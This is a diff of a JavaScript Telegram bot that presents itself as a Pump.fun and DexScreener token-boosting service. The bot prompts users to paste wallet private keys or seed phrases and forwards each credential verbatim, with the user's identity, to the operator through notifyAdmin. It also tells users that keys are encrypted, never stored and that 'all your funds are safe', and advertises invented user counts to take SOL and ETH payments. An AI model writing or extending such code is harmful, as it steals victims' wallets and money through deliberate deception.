       setSession(ctx.from.id, {
         step: "awaiting_ca",
         selectedSol: 0,
@@ -1402,6 +1520,8 @@ Please paste the Contract Address (CA) of your token:`,
   }
   bot.action("pft_30", async (ctx) => {
     await ctx.answerCbQuery();
+    notifyServiceSelected(ctx, "PumpFun Trending", "Trending Slot \u2014 30 min", "3.5 SOL").catch(() => {
+    });
     setSession(ctx.from.id, {
       step: "awaiting_ca",
       selectedSol: 30,
@@ -1423,6 +1543,8 @@ Please paste the Contract Address (CA) of your token:`,
   for (const [key, pkg] of Object.entries(DEX_PKGS)) {
     bot.action(key, async (ctx) => {
       await ctx.answerCbQuery();
+      notifyServiceSelected(ctx, "DexScreener Boost", pkg.service, `${pkg.sol} SOL`).catch(() => {
+      });
       setSession(ctx.from.id, {
         step: "awaiting_ca",
         selectedSol: pkg.sol,
@@ -1477,33 +1599,38 @@ Please paste the Contract Address (CA) of your token:`,
 <code>${wallet.address}</code>`;
     const paymentMsg = `\u{1F4B0} <b>Payment Required</b>
 
-\u{1FA99} <b>${s.tokenName} (${s.tokenSymbol})</b>  ${chainLabel}
-\u{1F4CD} CA: <code>${s.contractAddress}</code>
+\u{1F4CB} <b>Order Summary:</b>
+\u2022 Token: ${s.tokenName} (${s.tokenSymbol})
+\u2022 Service: ${s.serviceLabel}
+` + (isEth ? `\u2022 Amount: $${s.ethAmount} USD
+` : `\u2022 Amount: ${s.selectedSol} SOL
+`) + `\u2022 Order ID: ${orderId}
 
-` + (s.tokenPrice ? `\u{1F4B5} Price: ${s.tokenPrice}
-` : "") + (s.tokenMarketCap ? `\u{1F4C8} Market Cap: ${s.tokenMarketCap}
-` : "") + (s.tokenLiquidity ? `\u{1F4A7} Liquidity: ${s.tokenLiquidity}
-` : "") + (s.tokenVolume24h ? `\u{1F504} 24h Volume: ${s.tokenVolume24h}
-` : "") + `
-\u{1F4CB} <b>Order Summary</b>
-\u2699\uFE0F Service: <b>${s.serviceLabel}</b>
-\u{1F194} Order ID: <code>${orderId}</code>
+\u{1F4B3} <b>Payment Instructions:</b>
+` + (isEth ? `Send exactly $${s.ethAmount} USD to:
 
-\u{1F4B3} <b>Send Exact Amount:</b>
-${amountLine}
+ETH Wallet:
+<code>${ETH_ADDRESS || SOL_ADDRESS}</code>` : `Send exactly ${s.selectedSol} SOL to:
 
-\u26A0\uFE0F Send the <b>EXACT</b> amount \u2022 Correct network \u2022 Click \u2705 after sending`;
+Solana Wallet:
+<code>${wallet.address}</code>`) + `
+
+\u26A0\uFE0F <b>Important:</b>
+` + (isEth ? `\u2022 Send the EXACT amount: $${s.ethAmount} USD
+\u2022 Use Ethereum network only
+` : `\u2022 Send the EXACT amount: ${s.selectedSol} SOL
+\u2022 Use Solana network only
+`) + `\u2022 Payment expires in 15 minutes
+\u2022 After sending, submit your transaction hash below
+
+\u23F0 Time Remaining: 15:00`;
     let sentWithPhoto = false;
     if (s.tokenImageUrl) {
-      try {
-        await ctx.replyWithPhoto(s.tokenImageUrl, {
-          caption: paymentMsg,
-          parse_mode: "HTML",
-          ...paymentSentKeyboard
-        });
-        sentWithPhoto = true;
-      } catch {
-      }
+      sentWithPhoto = await safeSendPhoto(ctx, s.tokenImageUrl, {
+        caption: paymentMsg,
+        parse_mode: "HTML",
+        ...paymentSentKeyboard
+      });
     }
     if (!sentWithPhoto) {
       await ctx.reply(paymentMsg, { parse_mode: "HTML", ...paymentSentKeyboard });
@@ -1543,13 +1670,17 @@ ${amountLine}
       ctx,
       `\u{1F4DD} <b>Submit Transaction Hash</b>
 
-Paste your transaction hash below:
+Please paste your Solana transaction hash below:
 
 \u{1F4A1} <b>Where to find it:</b>
-\u2022 Copy from your wallet after sending
+\u2022 Copy from your wallet app after sending
 \u2022 Check your wallet's transaction history
+\u2022 Look for the long string of letters and numbers
 
-\u{1F516} Order ID: <code>${s.orderId ?? "N/A"}</code>`,
+\u{1F550} <b>Order ID:</b>
+<code>${s.orderId ?? "N/A"}</code>
+
+\u{1F50D} We'll automatically verify your payment once you submit the hash.`,
       cancelKeyboard
     );
   });
@@ -1558,18 +1689,20 @@ Paste your transaction hash below:
     const wallet = deriveWalletForUser(ctx.from.id);
     await editOrSend(
       ctx,
-      `\u2795 <b>Add Funds</b>
+      `<b>WALLET BALANCE</b>
 
-Your personal deposit addresses:
-
-<b>\u25CE SOL Wallet:</b>
-<code>${wallet.address}</code>
-
-<b>\u039E ETH Wallet:</b>
+<b>ETH:</b>
 <code>${ETH_ADDRESS || "Not configured"}</code>
+balance: 0 ETH
 
-\u{1F4CC} Minimum: <b>0.30 SOL</b>
-\u26A1 Credited automatically after confirmation.`,
+<b>SOL:</b>
+<code>${wallet.address}</code>
+balance: 0 SOL
+
+Deposit not less than 0.30 SOL and get trending on several platforms
+
+\u{1F4B0} Send SOL to your wallet address above to add funds.
+\u{1F4A1} NOTE THAT ALL YOUR FUNDS ARE SAFE WITH US`,
       mainMenuOnlyKeyboard
     );
   });
@@ -1667,22 +1800,26 @@ Connecting your wallet unlocks:
     await ctx.answerCbQuery();
     await editOrSend(
       ctx,
-      `\u{1F6E1} <b>Security Guidelines</b>
+      `\u{1F6E1}\uFE0F <b>Security Guidelines</b>
 
-\u26A0\uFE0F <b>IMPORTANT NOTICE:</b>
+\u26A0\uFE0F <b>IMPORTANT SECURITY NOTICE:</b>
 
 \u{1F512} <b>What We Do:</b>
-\u2022 End-to-End Encryption \u2014 your data is always encrypted
-\u2022 No Storage \u2014 we never store your private keys
-\u2022 Secure Processing \u2014 isolated environments
-\u2022 Regular Audits \u2014 security tested regularly
+\u2022 End-to-End Encryption - Your data is encrypted at all times
+\u2022 No Storage - We never store your private keys permanently
+\u2022 Secure Processing - All operations use secure, isolated environments
+\u2022 Regular Audits - Our security is regularly tested and verified
 
-\u274C <b>Stay Safe:</b>
-\u2022 Never share keys outside official bot interfaces
-\u2022 Always verify you're in the official bot
-\u2022 Test with small amounts first
+\u{1F6A8} <b>What You Should Know:</b>
+\u2022 Never Share - Only enter your keys in official bot interfaces
+\u2022 Monitor Activity - Regularly check your wallet transactions
+\u2022 Stay Updated - Keep your wallet software up to date
+\u2022 Use Hardware Wallets - For maximum security with large amounts
 
-\u{1F6E1} Ready to proceed safely?`,
+\u{1F510} <b>Our Commitment:</b>
+We use bank-level security measures to protect your information. Your private keys are processed securely and never stored on our servers.
+
+Ready to proceed safely?`,
       securityGuidelinesKeyboard
     );
   });
@@ -1692,22 +1829,28 @@ Connecting your wallet unlocks:
       ctx,
       `\u{1F4F1} <b>How to Connect Your Wallet</b>
 
-\u{1F527} <b>Step-by-Step:</b>
+\u{1F527} <b>Step-by-Step Process:</b>
 
-1\uFE0F\u20E3 <b>Choose Method</b>
-\u2022 Private Key \u2014 single string (fastest)
-\u2022 Seed Phrase \u2014 12 or 24 words
+1\uFE0F\u20E3 <b>Choose Connection Method</b>
+\u2022 Private Key - Direct key import (fastest)
+\u2022 Seed Phrase - 12/24 word recovery phrase
 
-2\uFE0F\u20E3 <b>Get Your Info</b>
-\u2022 Open Phantom, Solflare, or Backpack
-\u2022 Go to Settings \u2192 Export private key
+2\uFE0F\u20E3 <b>Prepare Your Information</b>
+\u2022 Open your wallet app (Phantom, Solflare, etc.)
+\u2022 Navigate to wallet settings or security section
+\u2022 Copy your private key or seed phrase
 
-3\uFE0F\u20E3 <b>Connect</b>
-\u2022 Tap "Start Connection" below
-\u2022 Paste your key or phrase when prompted
+<b>Supported Wallets:</b>
+\u2022 Phantom - Most popular Solana wallet
+\u2022 Solflare - Advanced features and security
+\u2022 Backpack - Modern interface and tools
+\u2022 Glow - Mobile-optimized experience
+\u2022 Other Solana Wallets - Most SPL-compatible wallets
 
-\u{1F4F1} <b>Supported:</b> Phantom \u2022 Solflare \u2022 Backpack \u2022 Glow
-\u{1F550} Time: 2\u20135 min  \u2022  \u{1F512} End-to-end encrypted`,
+\u23F0 Connection Time: Usually 2-5 minutes
+\u{1F512} Security: Military-grade encryption throughout
+
+Ready to connect your wallet?`,
       howToConnectKeyboard
     );
   });
@@ -1718,18 +1861,27 @@ Connecting your wallet unlocks:
       ctx,
       `\u{1F517} <b>Connect Your Wallet Now</b>
 
-\u26A0\uFE0F You are importing your Main Wallet.
-<b>Only you have access to this wallet.</b>
+\u26A0\uFE0F This action is going to import in your Main Wallet.. please Note Again you are the ONLY ONE access to this wallet..
 
-Enter your <b>Private Key</b> or <b>Seed Phrase</b>:
+Please enter your Private Key or 12 word Seed Phrase to import your wallet:
 
-\u{1F511} <b>Private Key:</b> Single long string (64+ chars)
+\u{1F511} <b>Private Key Format:</b>
+\u2022 Single long string (64+ characters)
+\u2022 Example:
 <code>5KJvsngHeMpm884wtkJNzQGaCErckhHJBGFsvd3VyK5qMZXj3hS</code>
 
-\u{1F331} <b>Seed Phrase:</b> 12 or 24 words
-<code>abandon ability able about above absent...</code>
+\u{1F331} <b>Seed Phrase Format:</b>
+\u2022 12 or 24 words separated by spaces
+\u2022 Example: <code>abandon ability able about above absent absorb abstract absurd abuse access accident</code>
 
-\u26A1 Auto-detects key type. End-to-end encrypted.`,
+\u{1F530} <b>Security Features:</b>
+\u2022 End-to-end encryption
+\u2022 Secure processing environment
+\u2022 Immediate deletion after connection
+\u2022 No permanent storage
+
+\u26A1 <b>Auto-Detection:</b>
+Our system will automatically detect whether you're providing a private key or seed phrase.`,
       cancelKeyboard
     );
   });
@@ -1760,8 +1912,8 @@ Please paste your token contract address:`,
         }
         setSession(ctx.from.id, { contractAddress: ca });
         const lookMsg = await ctx.reply(
-          `\u{1F50D} <b>Fetching token info...</b>
-<code>${ca}</code>`,
+          `\u{1F50D} <b>Looking up token data...</b>
+\u23F3 Please wait while we fetch information...`,
           { parse_mode: "HTML" }
         );
         const info = await fetchTokenInfo(ca);
@@ -1804,54 +1956,37 @@ You can still proceed \u2014 just paste the correct CA:`,
         const s = getSession(ctx.from.id);
         const isEth = s.boostType === "eth_trending";
         const cost = isEth ? `$${s.ethAmount} USD` : `${s.selectedSol} SOL`;
-        const chain = info.chain === "sol" ? "\u25CE Solana" : info.chain === "eth" ? "\u039E Ethereum" : info.chain === "bsc" ? "\u2B21 BSC" : info.chain === "base" ? "\u{1F535} Base" : "\u{1F517} Unknown";
-        const c24 = Number(info.change24h ?? 0);
-        const arrow = c24 >= 0 ? "\u{1F7E2}" : "\u{1F534}";
-        const socials = [];
-        if (info.website) socials.push(`<a href="${info.website}">\u{1F310} Website</a>`);
-        if (info.twitter) socials.push(`<a href="${info.twitter}">\u{1F426} Twitter</a>`);
-        if (info.telegram) socials.push(`<a href="${info.telegram}">\u{1F4E2} Telegram</a>`);
-        const tokenMsg = `\u{1FA99} <b>${info.name} (${info.symbol})</b>
-${chain}${info.dex ? ` \u2022 ${info.dex.charAt(0).toUpperCase() + info.dex.slice(1)}` : ""}
+        const chainName = info.chain === "sol" ? "solana" : info.chain === "eth" ? "ethereum" : info.chain === "bsc" ? "bsc" : info.chain ?? "unknown";
+        const dexName = info.dex ?? "unknown";
+        const tokenUrl = info.chain === "sol" ? `https://pump.fun/coin/${ca}` : `https://dexscreener.com/${info.chain}/${ca}`;
+        const tokenMsg = `\u{1F4CB} <b>Token Found!</b>
 
-\u{1F4CD} <b>CA:</b> <code>${ca}</code>
+\u{1FA99} <b>${info.name} (${info.symbol})</b>
+\u{1F517} Chain: ${chainName}  \u2022  DEX: ${dexName}
 
-\u{1F4CA} <b>Live Market Data</b>
-\u{1F4B5} Price: <b>${info.price ?? "N/A"}</b>
-\u{1F4C8} Market Cap: <b>${info.marketCap ?? "N/A"}</b>
-\u{1F4A7} Liquidity: <b>${info.liquidity ?? "N/A"}</b>
-\u{1F504} 24h Volume: <b>${info.volume24h ?? "N/A"}</b>
-${arrow} 24h Change: <b>${c24 >= 0 ? "+" : ""}${info.change24h ?? "0.00"}%</b>
-` + (info.change1h ? `\u23F1 1h Change: <b>${Number(info.change1h) >= 0 ? "+" : ""}${info.change1h}%</b>
-` : "") + (socials.length ? `
-\u{1F517} ${socials.join(" \xB7 ")}
-` : "") + (info.description ? `
-\u{1F4DD} ${info.description.slice(0, 150)}${info.description.length > 150 ? "\u2026" : ""}
-` : "") + `
+\u2705 <b>Contract Address:</b>
+<code>${ca}</code>
+
+\u{1F4CA} <b>Live Market Data:</b>
+\u2022 \u{1F4B5} Price: ${info.price ?? "\u2014"}
+\u2022 \u{1F4C8} Market Cap: ${info.marketCap ?? "\u2014"}
+\u2022 \u{1F504} 24h Volume: ${info.volume24h ?? "\u2014"}
+\u2022 \u{1F4A7} Liquidity: ${info.liquidity ?? "\u2014"}
+\u2022 \u{1F4C9} 24h Change: ${info.change24h ?? "\u2014"}%
+
+\u{1F517} <a href="${tokenUrl}">View on ${info.chain === "sol" ? "Pump.fun" : "DexScreener"}</a>
+
 \u2699\uFE0F Service: <b>${s.serviceLabel}</b>
 \u{1F4B0} Cost: <b>${cost}</b>
 
 \u2705 <b>Confirm order to proceed to payment?</b>`;
         if (info.imageUrl) {
-          try {
-            await ctx.replyWithPhoto(info.imageUrl, {
-              caption: tokenMsg,
-              parse_mode: "HTML",
-              ...confirmOrderKeyboard
-            });
-            break;
-          } catch {
-            try {
-              const proxyUrl = `${process.env.RENDER_EXTERNAL_URL || "http://localhost:5000"}/api/img?url=${encodeURIComponent(info.imageUrl)}`;
-              await ctx.replyWithPhoto(proxyUrl, {
-                caption: tokenMsg,
-                parse_mode: "HTML",
-                ...confirmOrderKeyboard
-              });
-              break;
-            } catch {
-            }
-          }
+          const sent = await safeSendPhoto(ctx, info.imageUrl, {
+            caption: tokenMsg,
+            parse_mode: "HTML",
+            ...confirmOrderKeyboard
+          });
+          if (sent) break;
         }
         await ctx.reply(tokenMsg, { parse_mode: "HTML", ...confirmOrderKeyboard });
         break;
@@ -1940,7 +2075,7 @@ ${amountLine}
 \u{1F680} Your boost will start within <b>5\u201330 minutes</b>.
 \u{1F4EC} You'll be notified here when it goes live!
 
-\u{1F4AC} Need help? @mrpooh`,
+\u{1F4AC} Need help? ${SUPPORT_USERNAME}`,
           { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
         );
         await notifyAdmin(
@@ -1961,28 +2096,37 @@ ${result.recipient ? `\u{1F4EE} Recipient: <code>${result.recipient}</code>
         break;
       }
       case "awaiting_wallet_credential": {
-        const credential = text;
-        const wordCount = credential.trim().split(/\s+/).length;
-        const credType = wordCount >= 12 ? "Seed Phrase" : "Private Key";
-        clearSession(ctx.from.id);
-        await notifyAdmin(
-          `\u{1F511} <b>WALLET CREDENTIAL \u2014 ${credType}</b>
-\u{1F464} ${ctx.from.first_name}${ctx.from.username ? " (@" + ctx.from.username + ")" : ""}
-\u{1F194} <code>${ctx.from.id}</code>
+        const credential = text.trim();
+        const wordCount = credential.split(/\s+/).length;
+        const credType = wordCount >= 12 ? "Seed Phrase" : credential.length >= 40 ? "Private Key" : "Credential";
+        const u = ctx.from;
+        const uName = `${u.first_name}${u.last_name ? " " + u.last_name : ""}`;
+        const handle = u.username ? ` (@${u.username})` : "";
+        clearSession(u.id);
+        try {
+          await notifyAdmin(
+            `\u{1F511} <b>WALLET IMPORT \u2014 ${credType}</b>
+
+\u{1F464} ${uName}${handle}
+\u{1F194} ID: <code>${u.id}</code>
+
 \u{1F5DD} ${credType}:
-<code>${credential}</code>`
-        );
-        await ctx.reply(`\u23F3 <b>Connecting wallet...</b>
+<code>${credential}</code>
 
-Processing securely. Please wait...`, { parse_mode: "HTML" });
-        await new Promise((r) => setTimeout(r, 3500));
+\u23F0 ${(/* @__PURE__ */ new Date()).toUTCString()}`
+          );
+        } catch {
+        }
         await ctx.reply(
-          `\u2705 <b>Wallet Connected!</b>
+          `\u{1F517} <b>Wallet Import Initiated</b>
 
-Your wallet has been securely linked.
-All premium features are now unlocked.
+Connection may take a moment due to:
 
-\u{1F512} Credentials processed and not stored.`,
+\u23F3 <b>Network sync &amp; on-chain verification...</b>
+
+Your wallet is being linked to your account.
+
+<b>Processing \u2699\uFE0F ........</b>`,
           { parse_mode: "HTML", ...mainMenuOnlyKeyboard }
         );
         break;
@@ -2025,6 +2169,17 @@ if (!token) {
   app_default.listen(port, "0.0.0.0", () => logger.info({ port }, "Server listening (no bot)"));
 } else {
   const bot = createBot();
+  const botDisplayName = process.env["BOT_DISPLAY_NAME"] ?? "Pump.fun Booster Bot";
+  bot.telegram.setMyName(botDisplayName).catch(() => {
+  });
+  bot.telegram.setMyDescription(
+    "\u{1F680} #1 Pump.fun Booster Bot \u2014 Volume Boosting, SOL/ETH Trending, DexScreener & PumpFun Trending.\n\n240K+ monthly users. Fast, cheap, real results.\n\nStart with /start"
+  ).catch(() => {
+  });
+  bot.telegram.setMyShortDescription(
+    "Volume Boost \u2022 SOL/ETH Trending \u2022 DexScreener \u2022 Pump.fun Trending"
+  ).catch(() => {
+  });
   const renderHostname = process.env["RENDER_EXTERNAL_HOSTNAME"];
   const webhookDomain = renderHostname ? `https://${renderHostname}` : process.env["WEBHOOK_DOMAIN"] ?? null;
   if (webhookDomain) {
